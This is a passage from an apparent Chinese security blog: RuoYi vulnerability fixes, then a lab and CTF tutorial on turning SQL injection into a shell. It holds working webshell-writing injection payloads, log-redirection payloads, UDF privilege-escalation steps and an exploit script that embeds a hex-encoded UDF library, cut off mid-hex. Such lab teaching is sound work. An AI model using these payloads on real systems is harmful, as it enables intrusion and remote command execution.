Throwable\n\t&#123;\n\t\tclearDataScope(point);\n\t\thandleDataScope(point);\n\t&#125;\n\n\tprivate void clearDataScope(final JoinPoint joinPoint)\n\t&#123;\n\t\tObject params = joinPoint.getArgs()[0];\n\t\tif (StringUtils.isNotNull(params) &amp;&amp; params instanceof BaseEntity)\n\t\t&#123;\n\t\t\tBaseEntity baseEntity = (BaseEntity) params;\n\t\t\tbaseEntity.getParams().put(DATA_SCOPE, \"\");\n\t\t&#125;\n\t&#125;\n\t......\n&#125;\n\n\n\n目录遍历 RuoYi &lt;&#x3D; v4.5.0检测漏洞：CommonController.java，/common/download/resource接口是否包含checkAllowDownload用于检查文件是否可下载，如果没有此方法则需要修改，防止被下载关键信息。\n漏洞复现略\n修复手段/**\n * 本地资源通用下载\n */\n@GetMapping(\"/common/download/resource\")\npublic void resourceDownload(String resource, HttpServletRequest request, HttpServletResponse response)\n\t\tthrows Exception\n&#123;\n\ttry\n\t&#123;\n\t\tif (!FileUtils.checkAllowDownload(resource))\n\t\t&#123;\n\t\t\tthrow new Exception(StringUtils.format(\"资源文件(&#123;&#125;)非法，不允许下载。 \", resource));\n\t\t&#125;\n\t\t// 本地资源路径\n\t\tString localPath = Global.getProfile();\n\t\t// 数据库资源地址\n\t\tString downloadPath = localPath + StringUtils.substringAfter(resource, Constants.RESOURCE_PREFIX);\n\t\t// 下载名称\n\t\tString downloadName = StringUtils.substringAfterLast(downloadPath, \"/\");\n\t\tresponse.setContentType(MediaType.APPLICATION_OCTET_STREAM_VALUE);\n\t\tFileUtils.setAttachmentResponseHeader(response, downloadName);\n\t\tFileUtils.writeBytes(downloadPath, response.getOutputStream());\n\t&#125;\n\tcatch (Exception e)\n\t&#123;\n\t\tlog.error(\"下载文件失败\", e);\n\t&#125;\n&#125;\n\n/**\n * 检查文件是否可下载\n * \n * @param resource 需要下载的文件\n * @return true 正常 false 非法\n */\npublic static boolean checkAllowDownload(String resource)\n&#123;\n\t// 禁止目录上跳级别\n\tif (StringUtils.contains(resource, \"..\"))\n\t&#123;\n\t\treturn false;\n\t&#125;\n\n\t// 检查允许下载的文件规则\n\tif (ArrayUtils.contains(MimeTypeUtils.DEFAULT_ALLOWED_EXTENSION, FileTypeUtils.getFileType(resource)))\n\t&#123;\n\t\treturn true;\n\t&#125;\n\n\t// 不在允许下载的文件规则\n\treturn false;\n&#125;\n\n\nSQL注入攻击 RuoYi &lt;&#x3D; v3.2.0若依管理系统使用了PageHelper，PageHelper提供了排序（Order by）的功能，前端直接传参完成排序。系统没有做字符检查，导致存在被注入的风险，最终造成数据库中存储的隐私信息全部泄漏。\n检测漏洞：BaseController.java 是否包含 String orderBy = pageDomain.getOrderBy();，如果没有字符检查需要修改，防止被执行注入攻击。\n解决方案：升级版本到 &gt;=v.3.2.0，或者重新添加字符检查String orderBy = SqlUtil.escapeOrderBySql(pageDomain.getOrderBy());，防止注入绕过。\npackage com.ruoyi.common.utils.sql;\n\nimport com.ruoyi.common.exception.base.BaseException;\nimport com.ruoyi.common.utils.StringUtils;\n\n/**\n * sql操作工具类\n * \n * @author ruoyi\n */\npublic class SqlUtil\n&#123;\n    /**\n     * 仅支持字母、数字、下划线、空格、逗号、小数点（支持多个字段排序）\n     */\n    public static String SQL_PATTERN = \"[a-zA-Z0-9_\\\\ \\\\,\\\\.]+\";\n\n    /**\n     * 检查字符，防止注入绕过\n     */\n    public static String escapeOrderBySql(String value)\n    &#123;\n        if (StringUtils.isNotEmpty(value) &amp;&amp; !isValidOrderBySql(value))\n        &#123;\n            throw new BaseException(\"参数不符合规范，不能进行查询\");\n        &#125;\n        return value;\n    &#125;\n\n    /**\n     * 验证 order by 语法是否符合规范\n     */\n    public static boolean isValidOrderBySql(String value)\n    &#123;\n        return value.matches(SQL_PATTERN);\n    &#125;\n&#125;\n\nshiro550 RuoYi &lt;&#x3D; v4.3.0若依管理系统使用了Apache Shiro，Shiro 提供了记住我（RememberMe）的功能，下次访问时无需再登录即可访问。系统将密钥硬编码在代码里，且在官方文档中并没有强调修改该密钥，导致框架使用者大多数都使用了默认密钥。攻击者可以构造一个恶意的对象，并且对其序列化、AES加密、base64编码后，作为cookie的rememberMe字段发送。Shiro将rememberMe进行解密并且反序列化，最终造成反序列化漏洞，进而在目标机器上执行任意命令。\n检测漏洞：ShiroConfig.java 是否包含 fCq+/xW488hMTCD+cmJ3aQ==，如果是使用的默认密钥则需要修改，防止被执行命令攻击。\n解决方案：升级版本到 &gt;=v.4.3.1，并且重新生成一个新的秘钥替换cipherKey，保证唯一且不要泄漏。\n# Shiro\nshiro:\n  cookie:\n    # 设置密钥，务必保持唯一性（生成方式，直接拷贝到main运行即可）KeyGenerator keygen = KeyGenerator.getInstance(\"AES\"); SecretKey deskey = keygen.generateKey(); System.out.println(Base64.encodeToString(deskey.getEncoded()));\n    cipherKey: zSyK5Kp6PZAAjlT+eeNMlg==\n\n\n// 直接拷贝到main运行即可生成一个Base64唯一字符串\nKeyGenerator keygen = KeyGenerator.getInstance(\"AES\");\nSecretKey deskey = keygen.generateKey();\nSystem.out.println(Base64.encodeToString(deskey.getEncoded()));","categories":["代码审计"],"tags":["代码审计"]},{"title":"SQL注入Getshell学习","url":"/2022/07/20/SQL%E6%B3%A8%E5%85%A5Getshell%E5%AD%A6%E4%B9%A0/","content":"SQL 注入 Getshell 学习\n\nSQL 注入 Getshell 学习0x01 前言\n基于靶场对 SQL 注入 getshell 的学习。\n\n之前看了一些师傅们写的 SQL 注入 getshell 的学习，还是讲理论的比较多，单纯看理论还是有点难度的。\n0x02 搭建 Sqli-Labs 辅助学习\n必然是用 docker 搭建的\n\ndocker pull acgpiano/sqli-labs\ndocker run -dt --name sqli-labs -p 8888:80 --rm acgpiano/sqli-labs\n\n接着进入到容器，很多操作就隔离开了，爽的一笔。\nsudo docker exec -it ID /bin/bash\n\n访问 IP + 端口，成功的话会如图所示\n\n0x03 getshell 方式1. into outfile&#x2F;dumpfile 传🐎原理分析into outfile利用的先决条件：\n\nweb目录具有写权限，能够使用单引号探测到网站的路径，需要放置与能解析，能访问的地址；比如 &#x2F;uploads 这种接口secure_file_priv 没有具体值（在mysql&#x2F;my.ini中查看）\n\nsecure_file_priv：secure_file_priv 是用来限制 load 、dumpfile、into outfile、load_file() 函数在哪个目录下拥有上传和读取文件的权限。\n关于 secure_file_priv 的配置介绍：\nsecure_file_priv 的值为null ，表示限制 mysqld 不允许导入|导出\n当 secure_file_priv 的值为 &#x2F;tmp&#x2F; ，表示限制 mysqld 的导入|导出只能发生在&#x2F;tmp&#x2F;目录下\n当 secure_file_priv 的值没有具体值时，表示不对 mysqld 的导入|导出做限制\n\n当 secure_file_priv 的值没有具体值时，才可以完成写入 shell 的操作\n\n写入 webshell （以 sqli-labs 第七关为例）\n\n看一下源码：\n# 使用单引号加双层括号拼接\n$sql=\"SELECT * FROM users WHERE id=(('$id')) LIMIT 0,1\";\n\n# 支持布尔盲注、延时盲注\nif true:\n    输出 You are in.... Use outfile......\nelse:\n    输出 You have an error in your SQL syntax\n  //print_r(mysql_error());\n\n探测 SQL 注入因为这里把 print_r(mysql_error()); 给注释掉了，所以就不可以使用报错注入了，这个时候只能使用布尔盲注和延时盲注。\npayload\n?id=3')) and sleep(5) --+\n这里要执行 sql 语句让它闭合，肯定是要用 )) 加上注释来闭合的。\n我们发现成功延时，所以注入点就为1’))，我们输入的字符被包含在单引号中，且单引号外有两个双引号包裹；最终根据显示出”你在……使用outfile……”这个提示；我们就找到了他要是使用SQL注入”一句话木马”达到getshll的目的\n接着用 order by 判断列数\n?id&#x3D;1&#39; )) order by 4 --+  &#x2F;&#x2F; 回显报错\n?id&#x3D;1&#39; )) order by 3 --+  &#x2F;&#x2F; 回显正确\n\n写入 shell写入 shell 之前，先看一看 secure_file_priv 的权限如何\n\n\n\n当secure_file_priv 的值为 空 时，表示不对 mysqld 的导入|导出做限制\n\n下面开始直接将数据库里面的信息导出到文件中\n&#x2F;?id&#x3D;1&#39;)) UNION SELECT * from security.users INTO OUTFILE &quot;users.txt&quot;--+\n\n因为导出没有指定路径，所以 Linux 下 MySQL 默认导出的路径为：\n/var/lib/mysql/security\n\n查看下是否将数据库信息导出到文件中了：\n\n\n但是这样并没有什么实际的作用，因为这个路径我们同过 Web 是无法访问的，所以这个导出的信息尽管是成功的，但是访问不到这个信息就白白作废了。\n所以一般我们将这个信息导出到网站的根目录下，所以需要知道网站的物理路径信息，因为这里是靶机，所有这里就直接导出到网站根目录下看看：\n目录一般都是 &#x2F;var&#x2F;www&#x2F;html&#x2F;…；猜测接口，或者爆破部分接口，来导出 mysql 的文件到 html 目录中，这样，我们就可以进一步对导出的数据进行控制。\n&#x2F;?id&#x3D;1&#39;))+UNION+SELECT * from security.users INTO OUTFILE &quot;&#x2F;var&#x2F;www&#x2F;html&#x2F;Less-7&#x2F;users.txt&quot;--+ \n\n这里因为这个 Docker 靶场环境没有配置好权限问题，我们通过 MySQL 直接往 Web 目录下写文件会是失败的，提示如下信息：\nsyntaxCan't create/write to file\n\n这个时候为了演示这个效果，这里只能进容器来手动把权限给开一下了：\n$ chmod -R 777 /var/www/html\n\n再执行上述的注入 payload，是可以访问 users.txt 的。\n$ curl http://127.0.0.1:8888/Less-7/users.txt\n1    Dumb    Dumb\n2    Angelina    I-kill-you\n3    Dummy    p@ssword\n4    secure    crappy\n5    stupid    stupidity\n6    superman    genious\n7    batman    mob!le\n8    admin    admin\n9    admin1    admin1\n10    admin2    admin2\n11    admin3    admin3\n12    dhakkan    dumbo\n14    admin4    admin4\n\n所以我们这里已经是有一定的操作空间了，进行进一步的写入 shell 攻击；\n既然是写入 shell，先写一句话木马\n&lt;?php eval($_REQUEST['cmd']);?>\n\n再把这一串一句话木马进行十六进制转码，虽然不用编码也可以，编码后在最前面加上 0x；\npayload 如下\n1&#39;)) union select 1,2,&quot;&lt;?php eval($_REQUEST[&#39;cmd&#39;]);?&gt;&quot; into outfile &quot;&#x2F;var&#x2F;www&#x2F;html&#x2F;Less-7&#x2F;info.php&quot; --+\n\n同样此处，可以使用 dumpfile 传入 🐎\n1&#39;)) union select 1,2,&quot;&lt;?php eval($_REQUEST[&#39;cmd&#39;]);?&gt;&quot; into dumpfile &quot;&#x2F;var&#x2F;www&#x2F;html&#x2F;Less-7&#x2F;info.php&quot; --+\n关于 outfile 和 dumpfile 的区别:outfile 可以通过 16 进制写入 shell，这个在 ctf 当中可以绕过 waf，比较常见。\noutfile 函数可以导出多行，而 dumpfile 只能导出一行数据；\noutfile 函数在将数据写到文件里时有特殊的格式转换，而 dumpfile 则保持原数据格式。但 dumpfile 不会自动对文件内容进行转义,而是原意写入（这就是为什么我们平时 UDF 提权时使用 dumpfile 来写入的原因）\n成功写入 shell，连 🐎 试试\n连🐎\n\n2. 堆叠注入 ———— 日志文件写 shell堆叠注入原理对应靶场 ———— sqli-Labs 38 \n源码如下：\n# id 参数直接带入到 SQL 语句中\n$id=$_GET['id'];\n$sql=\"SELECT * FROM users WHERE id='$id' LIMIT 0,1\";\nif (mysqli_multi_query($con1, $sql)):\n    输出查询信息\nelse:\n    print_r(mysqli_error($con1));\n\nmysqli_multi_query 函数用于执行一个 SQL 语句，或者多个使用分号分隔的 SQL 语句。这个就是堆叠注入产生的原因，因为本身就支持多个 SQL 语句。\n尝试一下简单的 payload 验证堆叠注入\n?id&#x3D;1&#39;;insert into users(username,password) values (&#39;hello&#39;,&#39;world&#39;);\n\n\n成功注入\n\n\n\n往日志中写入 shell上述是题目背景，payload 要结合后续讲的写入 shell 使用\n\n日志文件写入 shell 的前提条件\n\nWeb 文件夹宽松权限可以写入\n最好 Windows 系统下，Linux 很困难\n高权限运行 MySQL 或者 Apache\n\nMySQL 5.0 版本以上会创建日志文件，可以通过修改日志的全局变量来 getshell，可以通过这个命令查看。\nmysql> SHOW VARIABLES LIKE 'general%';\n\n\n\n第一个参数：general_log 需要是 ON 的状态，这样 MySQL 可以记录用户输入的每条命令，会把其保存在对应的日志文件中。\n第二个参数：general_log_file 是保存 log 的位置。\n对于我们要写入 shell 的话，很明显两个都要修改，需要 general_log 为 ON，再将 general_log_file 修改为一个我们可以访问的地方，就和上面 into outfile 传 🐎 一样。\n在注入当中修改这两个值，因为要将 webshell 写入文件夹当中，也需要先 chmod 一下对应的文件夹，如果嫌麻烦可以这样：\nsudo chmod -R 777 /var/www/html\n\n下面是修改参数的 payload\n?id&#x3D;1&#39;;set global general_log &#x3D; &quot;ON&quot;;set global general_log_file&#x3D;&#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;shell.php&#39;;--+\n\n此处记录日志的文件必须是在 html 下的，因为我们修改的是全局配置。\n写入 shell接着，尝试写入 shell\n?id&#x3D;1&#39;;select &lt;?php eval($_REQUEST[&#39;cmd&#39;]);?&gt;\n\n此时我们的一句话木马已经写入成功了；但是由于这里的用户权限是 mysql 用户组的，所以无法 getshell。\n\n\n不过在 Windows 下 phpstudy 测试是可以很成功的 getshell 的，相对于 Linux 中严格的 root 组，还是比较难的。\n3. 通过 udf 提权\n在本篇文章中，udf 提权的部分主要关注于反弹端口提权这一种\n\nudf 提权原理在 MySQL &gt;&#x3D; 5.1 的版本中，我们可以通过创建自定义函数的方式来执行恶意代码；这个自定义函数就和我们平常写代码的 def function() 一样。\n合理的思路是，在自定义函数当中写一些恶意的弹 shell 语句，至于为什么要写弹 shell 语句，弹 shell 语句如何实现，可以参考我这一篇文章 反弹shell学习\n在 MySQL &gt;&#x3D; 5.1 的版本中的能够生效的自定义函数是放置于 &#x2F;usr&#x2F;lib&#x2F;MySQL目录&#x2F;plugin 这里。\n我这里以 Linux 的靶子为例说明一下，因为两个操作系统在这点 udf 提权上只是有这么一点差别 ———— Linux 写入的是 .so 文件，Windows 写入的是 .dll 文件\n在找到注入点之后有两种主要的手段，一种是用 sqlmap 自动跑，因为 sqlmap 自带有攻击的恶意文件，针对 Linux 打是用 .so 文件；针对 Windows 打是用 .dll 文件。\npayload 如下\nsqlmap -u \"http://localhost:30008/\" --data=\"id=1\" --file-write=\"/Users/sec/Desktop/lib_mysqludf_sys_64.so\" --file-dest=\"/usr/lib/mysql/plugin/udf.so\"\n\n还有一种是手工注的，手工注入我个人是更加喜欢一点，如果不结合靶场看，想看懂还是有难度的。我会把手工注入这个放到下面和题目一起讲。\n靶场练习\n刚好前阵子打了 NepCTF 比赛，其中就有一道 udf 提权的题目，题目链接如下\n\nhttp://nep.lemonprefect.cn/category/web/challenge/15\n先看源码当中的注入点：\n\n\n在 scores.php 的 56 行这里，multi_query 引起的堆叠注入，所以我们后续的 payload 如下\n1&#39;;evil code; #\n\n这里也讲一讲为什么会想到 udf 提权吧，这个不是空穴来风。题目附件这里给了个 init.sql，我们可以看到 ctf 用户 *.* 的 file和 insert 权限。\n且init.sql的score.ctf表也写明了flag_in_&#x2F;flag，要么通过读取文件的方式将flag读入获取，要么udf提权，操作系统函数。\n\n\n同时根据附件给的 my.cnf，配置文件都是默认配置，且 secure-file-priv 直接给到了 plugin 目录下\n\n\nudf 提权的攻击分这么几步走\n使用 dumpfile 写入 .so 文件\n由于服务器是 linux-x64，在 github 选取合适的 .so 文件或者自己编译，本地使用 select 获取其 hex 值。也可以去国光师傅的工具栏直接拿 https://www.sqlsec.com/tools/udf.html\n得到要写入 .so 文件的东西之后，执行 payload\n1&#39;;select &lt;十六进制编码&gt; into dumpfile &#39;&#x2F;usr&#x2F;lib64&#x2F;mysql&#x2F;plugin&#x2F;exp.so&#39;;#\n\n创建 udf\naaa&#39;;CREATE FUNCTION sys_eval RETURNS STRING SONAME &#39;exp.so&#39;;#\n\n执行 RCE 命令\naaa&#39;;select sys_eval(&#39;id&#39;);#\n\n一般最后的这个 RCE 命令都是弹 shell 的，在实际攻击的过程中，会写 EXP，会把这三个命令都串到一起发包\n弹 shell 的 EXP我直接把 Err0r 大大写的 EXP 挂出来\nimport random\nimport string\n\nimport requests\nimport time\n\nurl = \"http://127.0.0.1:20712\"\n\nCMD = \"&lt;执行的命令>\"\n\nsession = requests.session()\nCOOKIES = &#123;\n\n&#125;\nHEADERS = &#123;\n    \"Origin\": \"\",\n    \"User-Agent\": \"Mozilla/5.0 (iPhone; CPU iPhone OS 15_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148\",\n    \"Referer\": \"\",\n    'Content-Type': 'application/x-www-form-urlencoded',\n&#125;\n\n\ndef req(url, method='get', cookies=&#123;&#125;, headers=&#123;&#125;, timeout=5, allow_redirects=True, **kwargs):\n    # print(url)\n    data = kwargs.get(\"data\")\n    params = kwargs.get(\"params\")\n    cookies.update(COOKIES)\n    headers.update(HEADERS)\n    if method == 'get':\n        resp = session.get(\n            url=url,\n            data=data,\n            params=params,\n            headers=headers,\n            cookies=cookies,\n            timeout=timeout,\n            allow_redirects=allow_redirects\n        )\n    elif method == 'post':\n        resp = session.post(\n            url=url,\n            data=data,\n            params=params,\n            headers=headers,\n            cookies=cookies,\n            timeout=timeout,\n            allow_redirects=allow_redirects\n        )\n    else:\n        session.close()  # close session\n        raise Exception('Requests method error.')\n    return resp.content.decode('utf8')\n\n\ndef getRadmonStr():\n    return ''.join(random.sample(string.ascii_letters + string.digits, 8))\n\n\ndef reg(sql):\n    tarurl = url + \"/register.php\"\n    studentid = getRadmonStr()\n    params = &#123;\n        \"username\": sql,\n        \"studentid\": studentid,\n        \"submit\": \"提交\"\n    &#125;\n    res = req(tarurl, data=params, method=\"post\")\n    return studentid\n\n\ndef login(username, studentid):\n    tarurl = url + \"/login.php\"\n    params = &#123;\n        \"username\": username,\n        \"studentid\": studentid,\n        \"submit\": \"提交\"\n    &#125;\n    res = req(tarurl, data=params, method=\"post\")\n    # print(res)\n    return res\n\n\ndef logout():\n    tarurl = url + \"/logout.php\"\n    res = req(tarurl)\n\n\ndef postAns():\n    tarurl = url + \"/index.php\"\n    params = &#123;\n        \"q1\": \"1\",\n        \"q2\": \"1\",\n        \"q3\": \"4\",\n        # \"q6\": \"5\"\n        \"q4\": \"1\",\n        \"q5\": \"1\",\n    &#125;\n    res = req(tarurl, data=params, method=\"post\")\n    # print(res)\n\n\ndef posScore(studentid):\n    tarurl = url + \"/score.php\"\n    params = &#123;\n        \"studentid\": studentid,\n    &#125;\n    res = req(tarurl, data=params, method=\"post\")\n    # print(res)\n\n\nif __name__ == '__main__':\n    passwd = getRadmonStr()\n    poc = [\n        # 这里可以利用特性直接select获取到admin密码，或者像这样直接修改admin密码\n        f\"&#123;getRadmonStr()&#125;','&#123;getRadmonStr()&#125;','&#123;getRadmonStr()&#125;','&#123;getRadmonStr()&#125;','&#123;getRadmonStr()&#125;','&#123;getRadmonStr()&#125;');update users set studentid='&#123;passwd&#125;' where username='admin';\\x23\",\n        f\"&#123;getRadmonStr()&#125;';select 0x7F454C4602010100000000000000000003003E0001000000D00C0000000000004000000000000000E8180000000000000000000040003800050040001A00190001000000050000000000000000000000000000000000000000000000000000001415000000000000141500000000000000002000000000000100000006000000181500000000000018152000000000001815200000000000700200000000000080020000000000000000200000000000020000000600000040150000000000004015200000000000401520000000000090010000000000009001000000000000080000000000000050E57464040000006412000000000000641200000000000064120000000000009C000000000000009C00000000000000040000000000000051E5746406000000000000000000000000000000000000000000000000000000000000000000000000000000000000000800000000000000250000002B0000001500000005000000280000001E000000000000000000000006000000000000000C00000000000000070000002A00000009000000210000000000000000000000270000000B0000002200000018000000240000000E00000000000000040000001D0000001600000000000000130000000000000000000000120000002300000010000000250000001A0000000F000000000000000000000000000000000000001B00000000000000030000000000000000000000000000000000000000000000000000002900000014000000000000001900000020000000000000000A00000011000000000000000000000000000000000000000D0000002600000017000000000000000800000000000000000000000000000000000000000000001F0000001C0000000000000000000000000000000000000000000000020000000000000011000000140000000200000007000000800803499119C4C93DA4400398046883140000001600000017000000190000001B0000001D0000002000000022000000000000002300000000000000240000002500000027000000290000002A00000000000000CE2CC0BA673C7690EBD3EF0E78722788B98DF10ED871581CC1E2F7DEA868BE12BBE3927C7E8B92CD1E7066A9C3F9BFBA745BB073371974EC4345D5ECC5A62C1CC3138AFF36AC68AE3B9FD4A0AC73D1C525681B320B5911FEAB5FBE120000000000000000000000000000000000000000000000000000000003000900A00B0000000000000000000000000000010000002000000000000000000000000000000000000000250000002000000000000000000000000000000000000000E0000000120000000000000000000000DE01000000000000790100001200000000000000000000007700000000000000BA0000001200000000000000000000003504000000000000F5000000120000000000000000000000C2010000000000009E010000120000000000000000000000D900000000000000FB000000120000000000000000000000050000000000000016000000220000000000000000000000FE00000000000000CF000000120000000000000000000000AD00000000000000880100001200000000000000000000008000000000000000AB010000120000000000000000000000250100000000000010010000120000000000000000000000DC00000000000000C7000000120000000000000000000000C200000000000000B5000000120000000000000000000000CC02000000000000ED000000120000000000000000000000E802000000000000E70000001200000000000000000000009B00000000000000C200000012000000000000000000000028000000000000008001000012000B007A100000000000006E000000000000007500000012000B00A70D00000000000001000000000000001000000012000C00781100000000000000000000000000003F01000012000B001A100000000000002D000000000000001F01000012000900A00B0000000000000000000000000000C30100001000F1FF881720000000000000000000000000009600000012000B00AB0D00000000000001000000000000007001000012000B0066100000000000001400000000000000CF0100001000F1FF981720000000000000000000000000005600000012000B00A50D00000000000001000000000000000201000012000B002E0F0000000000002900000000000000A301000012000B00F71000000000000041000000000000003900000012000B00A40D00000000000001000000000000003201000012000B00EA0F0000000000003000000000000000BC0100001000F1FF881720000000000000000000000000006500000012000B00A60D00000000000001000000000000002501000012000B00800F0000000000006A000000000000008500000012000B00A80D00000000000003000000000000001701000012000B00570F00000000000029000000000000005501000012000B0047100000000000001F00000000000000A900000012000B00AC0D0000000000009A000000000000008F01000012000B00E8100000000000000F00000000000000D700000012000B00460E000000000000E800000000000000005F5F676D6F6E5F73746172745F5F005F66696E69005F5F6378615F66696E616C697A65005F4A765F5265676973746572436C6173736573006C69625F6D7973716C7564665F7379735F696E666F5F6465696E6974007379735F6765745F6465696E6974007379735F657865635F6465696E6974007379735F6576616C5F6465696E6974007379735F62696E6576616C5F696E6974007379735F62696E6576616C5F6465696E6974007379735F62696E6576616C00666F726B00737973636F6E66006D6D6170007374726E6370790077616974706964007379735F6576616C006D616C6C6F6300706F70656E007265616C6C6F630066676574730070636C6F7365007379735F6576616C5F696E697400737472637079007379735F657865635F696E6974007379735F7365745F696E6974007379735F6765745F696E6974006C69625F6D7973716C7564665F7379735F696E666F006C69625F6D7973716C7564665F7379735F696E666F5F696E6974007379735F657865630073797374656D007379735F73657400736574656E76007379735F7365745F6465696E69740066726565007379735F67657400676574656E76006C6962632E736F2E36005F6564617461005F5F6273735F7374617274005F656E6400474C4942435F322E322E35000000000000000000020002000200020002000200020002000200020002000200020002000200020001000100010001000100010001000100010001000100010001000100010001000100010001000100010001000100000001000100B20100001000000000000000751A690900000200D401000000000000801720000000000008000000000000008017200000000000D01620000000000006000000020000000000000000000000D81620000000000006000000030000000000000000000000E016200000000000060000000A00000000000000000000000017200000000000070000000400000000000000000000000817200000000000070000000500000000000000000000001017200000000000070000000600000000000000000000001817200000000000070000000700000000000000000000002017200000000000070000000800000000000000000000002817200000000000070000000900000000000000000000003017200000000000070000000A00000000000000000000003817200000000000070000000B00000000000000000000004017200000000000070000000C00000000000000000000004817200000000000070000000D00000000000000000000005017200000000000070000000E00000000000000000000005817200000000000070000000F00000000000000000000006017200000000000070000001000000000000000000000006817200000000000070000001100000000000000000000007017200000000000070000001200000000000000000000007817200000000000070000001300000000000000000000004883EC08E827010000E8C2010000E88D0500004883C408C3FF35320B2000FF25340B20000F1F4000FF25320B20006800000000E9E0FFFFFFFF252A0B20006801000000E9D0FFFFFFFF25220B20006802000000E9C0FFFFFFFF251A0B20006803000000E9B0FFFFFFFF25120B20006804000000E9A0FFFFFFFF250A0B20006805000000E990FFFFFFFF25020B20006806000000E980FFFFFFFF25FA0A20006807000000E970FFFFFFFF25F20A20006808000000E960FFFFFFFF25EA0A20006809000000E950FFFFFFFF25E20A2000680A000000E940FFFFFFFF25DA0A2000680B000000E930FFFFFFFF25D20A2000680C000000E920FFFFFFFF25CA0A2000680D000000E910FFFFFFFF25C20A2000680E000000E900FFFFFFFF25BA0A2000680F000000E9F0FEFFFF00000000000000004883EC08488B05F50920004885C07402FFD04883C408C390909090909090909055803D900A2000004889E5415453756248833DD809200000740C488B3D6F0A2000E812FFFFFF488D05130820004C8D2504082000488B15650A20004C29E048C1F803488D58FF4839DA73200F1F440000488D4201488905450A200041FF14C4488B153A0A20004839DA72E5C605260A2000015B415CC9C3660F1F8400000000005548833DBF072000004889E57422488B05530920004885C07416488D3DA70720004989C3C941FFE30F1F840000000000C9C39090C3C3C3C331C0C3C341544883C9FF4989F455534883EC10488B4610488B3831C0F2AE48F7D1488D69FFE8B6FEFFFF83F80089C77C61754FBF1E000000E803FEFFFF488D70FF4531C94531C031FFB921000000BA07000000488D042E48F7D64821C6E8AEFEFFFF4883F8FF4889C37427498B4424104889EA4889DF488B30E852FEFFFFFFD3EB0CBA0100000031F6E802FEFFFF31C0EB05B8010000005A595B5D415CC34157BF00040000415641554531ED415455534889F34883EC1848894C24104C89442408E85AFDFFFFBF010000004989C6E84DFDFFFFC600004889C5488B4310488D356A030000488B38E814FEFFFF4989C7EB374C89F731C04883C9FFF2AE4889EF48F7D1488D59FF4D8D641D004C89E6E8DDFDFFFF4A8D3C284889DA4C89F64D89E54889C5E8A8FDFFFF4C89FABE080000004C89F7E818FDFFFF4885C075B44C89FFE82BFDFFFF807D0000750A488B442408C60001EB1F42C6442DFF0031C04883C9FF4889EFF2AE488B44241048F7D148FFC94889084883C4184889E85B5D415C415D415E415FC34883EC08833E014889D7750B488B460831D2833800740E488D353A020000E817FDFFFFB20188D05EC34883EC08833E014889D7750B488B460831D2833800740E488D3511020000E8EEFCFFFFB20188D05FC3554889FD534889D34883EC08833E027409488D3519020000EB3F488B46088338007409488D3526020000EB2DC7400400000000488B4618488B384883C70248037808E801FCFFFF31D24885C0488945107511488D351F0200004889DFE887FCFFFFB20141585B88D05DC34883EC08833E014889F94889D77510488B46088338007507C6010131C0EB0E488D3576010000E853FCFFFFB0014159C34154488D35EF0100004989CC4889D7534889D34883EC08E832FCFFFF49C704241E0000004889D8415A5B415CC34883EC0831C0833E004889D7740E488D35D5010000E807FCFFFFB001415BC34883EC08488B4610488B38E862FBFFFF5A4898C34883EC28488B46184C8B4F104989F2488B08488B46104C89CF488B004D8D4409014889C6F3A44C89C7498B4218488B0041C6040100498B4210498B5218488B4008488B4A08BA010000004889C6F3A44C89C64C89CF498B4218488B400841C6040000E867FBFFFF4883C4284898C3488B7F104885FF7405E912FBFFFFC3554889CD534C89C34883EC08488B4610488B38E849FBFFFF4885C04889C27505C60301EB1531C04883C9FF4889D7F2AE48F7D148FFC948894D00595B4889D05DC39090909090909090554889E5534883EC08488B05C80320004883F8FF7419488D1DBB0320000F1F004883EB08FFD0488B034883F8FF75F14883C4085BC9C390904883EC08E86FFBFFFF4883C408C345787065637465642065786163746C79206F6E6520737472696E67207479706520706172616D657465720045787065637465642065786163746C792074776F20617267756D656E747300457870656374656420737472696E67207479706520666F72206E616D6520706172616D6574657200436F756C64206E6F7420616C6C6F63617465206D656D6F7279006C69625F6D7973716C7564665F7379732076657273696F6E20302E302E34004E6F20617267756D656E747320616C6C6F77656420287564663A206C69625F6D7973716C7564665F7379735F696E666F290000011B033B980000001200000040FBFFFFB400000041FBFFFFCC00000042FBFFFFE400000043FBFFFFFC00000044FBFFFF1401000047FBFFFF2C01000048FBFFFF44010000E2FBFFFF6C010000CAFCFFFFA4010000F3FCFFFFBC0100001CFDFFFFD401000086FDFFFFF4010000B6FDFFFF0C020000E3FDFFFF2C02000002FEFFFF4402000016FEFFFF5C02000084FEFFFF7402000093FEFFFF8C0200001400000000000000017A5200017810011B0C070890010000140000001C00000084FAFFFF01000000000000000000000014000000340000006DFAFFFF010000000000000000000000140000004C00000056FAFFFF01000000000000000000000014000000640000003FFAFFFF010000000000000000000000140000007C00000028FAFFFF030000000000000000000000140000009400000013FAFFFF01000000000000000000000024000000AC000000FCF9FFFF9A00000000420E108C02480E18410E20440E3083048603000000000034000000D40000006EFAFFFFE800000000420E10470E18420E208D048E038F02450E28410E30410E38830786068C05470E50000000000000140000000C0100001EFBFFFF2900000000440E100000000014000000240100002FFBFFFF2900000000440E10000000001C0000003C01000040FBFFFF6A00000000410E108602440E188303470E200000140000005C0100008AFBFFFF3000000000440E10000000001C00000074010000A2FBFFFF2D00000000420E108C024E0E188303470E2000001400000094010000AFFBFFFF1F00000000440E100000000014000000AC010000B6FBFFFF1400000000440E100000000014000000C4010000B2FBFFFF6E00000000440E300000000014000000DC01000008FCFFFF0F00000000000000000000001C000000F4010000FFFBFFFF4100000000410E108602440E188303470E2000000000000000000000FFFFFFFFFFFFFFFF0000000000000000FFFFFFFFFFFFFFFF000000000000000000000000000000000100000000000000B2010000000000000C00000000000000A00B0000000000000D00000000000000781100000000000004000000000000005801000000000000F5FEFF6F00000000A00200000000000005000000000000006807000000000000060000000000000060030000000000000A00000000000000E0010000000000000B0000000000000018000000000000000300000000000000E81620000000000002000000000000008001000000000000140000000000000007000000000000001700000000000000200A0000000000000700000000000000C0090000000000000800000000000000600000000000000009000000000000001800000000000000FEFFFF6F00000000A009000000000000FFFFFF6F000000000100000000000000F0FFFF6F000000004809000000000000F9FFFF6F0000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000401520000000000000000000000000000000000000000000CE0B000000000000DE0B000000000000EE0B000000000000FE0B0000000000000E0C0000000000001E0C0000000000002E0C0000000000003E0C0000000000004E0C0000000000005E0C0000000000006E0C0000000000007E0C0000000000008E0C0000000000009